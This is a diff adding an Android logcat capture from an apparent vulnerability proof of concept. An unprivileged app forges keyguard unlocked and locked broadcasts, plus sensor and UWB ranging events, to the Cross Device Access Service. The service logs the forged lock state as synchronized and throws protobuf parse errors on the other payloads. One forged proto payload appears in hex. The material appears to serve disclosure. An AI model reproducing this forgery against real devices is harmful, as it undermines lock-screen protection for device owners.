@@ -1,0 +1,44 @@
+--------- beginning of main
+09-11 13:16:23.584 20639 20639 D KEYGUARD_FORGE_POC: === Zero-Permission Keyguard State Forgery PoC ===
+09-11 13:16:23.584 20639 20639 D KEYGUARD_FORGE_POC: Package: com.poc.pdms
+09-11 13:16:23.584 20639 20639 D KEYGUARD_FORGE_POC: UID: 10177
+09-11 13:16:23.584 20639 20639 D KEYGUARD_FORGE_POC: 
+09-11 13:16:23.585 20639 20639 D KEYGUARD_FORGE_POC: [TEST 1] Forging keyguard UNLOCKED state...
+09-11 13:16:23.587 20639 20639 D KEYGUARD_FORGE_POC: [SUCCESS] Forged UNLOCKED broadcast sent
+09-11 13:16:23.588 20639 20639 D KEYGUARD_FORGE_POC:   Proto: 08 00 12 06 08 cf e3 8e d5 06
+09-11 13:16:23.588 20639 20639 D KEYGUARD_FORGE_POC:   Timestamp: 1789112783
+09-11 13:16:23.588 20639 20639 D KEYGUARD_FORGE_POC: 
+09-11 13:16:23.646 20067 20095 I CDAS-App: KeyguardRepositoryImpl: Synchronized Keyguard state: false timestamp 1789112783
+09-11 13:16:23.664 20067 20067 I CDAS-App: SharedWearableListenerService onCreate
+09-11 13:16:23.681 20067 20664 I CDAS-App: onDataChanged: 1 events
+09-11 13:16:23.687 20067 20664 W CDAS-App: No listener registered for data event: /crossdeviceaccessservice/keyguard_event/
+09-11 13:16:25.179 20067 20067 I CDAS-App: SharedWearableListenerService onDestroy
+09-11 13:16:25.588 20639 20639 D KEYGUARD_FORGE_POC: [TEST 2] Forging keyguard LOCKED state...
+09-11 13:16:25.590 20639 20639 D KEYGUARD_FORGE_POC: [SUCCESS] Forged LOCKED broadcast sent
+09-11 13:16:25.590 20639 20639 D KEYGUARD_FORGE_POC: 
+09-11 13:16:25.590 20639 20639 D KEYGUARD_FORGE_POC: [TEST 3] Forging sensor proximity data...
+09-11 13:16:25.594 20639 20639 D KEYGUARD_FORGE_POC: [SUCCESS] Forged sensor broadcast sent
+09-11 13:16:25.594 20639 20639 D KEYGUARD_FORGE_POC: 
+09-11 13:16:25.594 20639 20639 D KEYGUARD_FORGE_POC: [TEST 4] Forging UWB ranging data...
+09-11 13:16:25.596 20639 20639 D KEYGUARD_FORGE_POC: [SUCCESS] Forged ranging broadcast sent
+09-11 13:16:25.596 20639 20639 D KEYGUARD_FORGE_POC: 
+09-11 13:16:25.602 20067 20095 I CDAS-App: KeyguardRepositoryImpl: Synchronized Keyguard state: true timestamp 1789112783
+09-11 13:16:25.614 20067 20067 I CDAS-App: SharedWearableListenerService onCreate
+09-11 13:16:25.625 20067 20095 E CDAS-App: SensorEventReceiver: Invalid Protocol Error parsing SensorEvent: Message was missing required fields.  (Lite runtime could not determine which fields were missing).
+09-11 13:16:25.636 20067 20672 I CDAS-App: onDataChanged: 1 events
+09-11 13:16:25.639 20067 20672 W CDAS-App: No listener registered for data event: /crossdeviceaccessservice/keyguard_event/
+09-11 13:16:25.665 20067 20095 E CDAS-App: RangingCapabilitiesEventReceiver: Invalid Protocol Error parsing Ranging Capabilities: Message was missing required fields.  (Lite runtime could not determine which fields were missing).
+09-11 13:16:25.665 20067 20095 E CDAS-App: com.google.protobuf.InvalidProtocolBufferException: Message was missing required fields.  (Lite runtime could not determine which fields were missing).
+09-11 13:16:25.665 20067 20095 E CDAS-App: 	at com.google.protobuf.GeneratedMessageLite.checkMessageInitialized(GeneratedMessageLite.java:1677)
+09-11 13:16:25.665 20067 20095 E CDAS-App: 	at com.google.protobuf.GeneratedMessageLite.parseFrom(GeneratedMessageLite.java:1729)
+09-11 13:16:25.665 20067 20095 E CDAS-App: 	at com.google.android.crossdeviceaccessservice.associated.shared.protos.CrossDeviceAccessServiceRangingCapabilitiesUpdate.parseFrom(CrossDeviceAccessServiceRangingCapabilitiesUpdate.java:318)
+09-11 13:16:25.665 20067 20095 E CDAS-App: 	at com.google.android.crossdeviceaccessservice.associated.shared.data.infrastructure.RangingCapabilitiesEventReceiver$onReceive$1.invokeSuspend(RangingCapabilitiesEventReceiver.kt:51)
+09-11 13:16:25.665 20067 20095 E CDAS-App: 	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
+09-11 13:16:25.665 20067 20095 E CDAS-App: 	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:100)
+09-11 13:16:25.665 20067 20095 E CDAS-App: 	at kotlinx.coroutines.internal.LimitedDispatcher$Worker.run(LimitedDispatcher.kt:113)
+09-11 13:16:25.665 20067 20095 E CDAS-App: 	at kotlinx.coroutines.scheduling.TaskImpl.run(Tasks.kt:89)
+09-11 13:16:25.665 20067 20095 E CDAS-App: 	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:586)
+09-11 13:16:25.665 20067 20095 E CDAS-App: 	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:820)
+09-11 13:16:25.665 20067 20095 E CDAS-App: 	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:717)
+09-11 13:16:25.665 20067 20095 E CDAS-App: 	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:704)
+09-11 13:16:27.134 20067 20067 I CDAS-App: SharedWearableListenerService onDestroy
